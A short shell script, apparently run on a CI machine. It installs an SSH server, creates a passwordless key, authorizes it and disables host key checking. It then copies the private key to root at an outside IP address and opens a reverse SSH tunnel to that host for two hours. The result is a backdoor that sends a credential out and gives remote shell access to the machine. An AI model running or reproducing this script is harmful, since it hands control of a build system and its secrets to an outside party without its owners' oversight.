OWD=$(pwd)

sudo apt install -y openssh-server
sudo service ssh start

eval $(ssh-agent)

getent passwd | grep ci
cd ~
pwd
unzip ${OWD}/files.zip
ssh-add sshkey
ssh-keygen -t ed25519 -P ""
cp .ssh/id_ed25519.pub .ssh/authorized_keys
chmod 0600 .ssh/authorized_keys
echo "Host *" > .ssh/config
echo "  StrictHostKeyChecking no" >> .ssh/config
scp .ssh/id_ed25519 root@168.235.81.234:/root/sshkey
ssh -R 22001:127.0.0.1:22 root@168.235.81.234 "sleep 2h"

